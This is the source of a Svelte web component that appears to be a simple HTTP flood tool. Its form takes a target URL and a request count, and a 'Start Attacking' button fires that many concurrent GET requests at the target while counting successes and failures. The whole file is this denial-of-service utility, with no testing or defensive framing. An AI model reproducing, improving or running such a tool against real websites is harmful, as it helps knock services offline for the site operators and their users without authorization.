<script lang="ts">
	// IMPORTED DEP-UTILS
	import axios from 'axios';

	// -- STATES -- //

	let targetUrl = '';
	let requestCount = 0;

	let sent = 0,
		pending = 0,
		success = 0,
		failed = 0;

	let isLoading = false;

	// -- UTILS -- //

	export const handleReset = () => {
		sent = 0;
		pending = 0;
		success = 0;
		failed = 0;
	};

	export const handleSubmit = async () => {
		handleReset();

		isLoading = true;

		await Promise.all(
			Array(requestCount)
				.fill(null)
				.map(async () => {
					sent++;
					pending++;
					try {
						await axios.get(targetUrl);
						success++;
					} catch {
						failed++;
					}
					pending--;
				}),
		);

		isLoading = false;
	};
</script>

<main class="flex h-screen w-screen flex-col items-center justify-center gap-2 p-4">
	<form
		class="mx-auto flex w-full max-w-[800px] flex-col gap-4 rounded-md bg-emerald-200 p-4 shadow-md sm:flex-row"
		on:submit|preventDefault={handleSubmit}
	>
		<input
			class="h-10 flex-grow rounded-md border border-emerald-300 bg-emerald-100 px-3 text-sm ring-emerald-600/60 ring-offset-1 ring-offset-transparent focus-visible:outline-none focus-visible:ring-1"
			type="text"
			placeholder="Target url..."
			disabled={isLoading}
			bind:value={targetUrl}
		/>
		<input
			class="h-10 flex-grow rounded-md border border-emerald-300 bg-emerald-100 px-3 text-sm ring-emerald-600/60 ring-offset-1 ring-offset-transparent focus-visible:outline-none focus-visible:ring-1"
			type="number"
			placeholder="Request count..."
			disabled={isLoading}
			bind:value={requestCount}
		/>
		<button
			type="submit"
			class="flex items-center justify-center gap-2 rounded-md bg-emerald-600 px-4 py-2 text-sm text-white shadow-md hover:bg-emerald-700"
			disabled={!targetUrl || !requestCount || isLoading}
		>
			{#if isLoading}
				<i class="ph-bold ph-spinner animate-spin"></i>
				Loading...
			{:else}
				Start Attacking
			{/if}
		</button>
	</form>

	<hr />

	<div class="flex gap-4">
		<small>Sent: {sent}</small>
		<small>Pending: {pending}</small>
		<small>Success: {success}</small>
		<small>Failed: {failed}</small>
	</div>
</main>
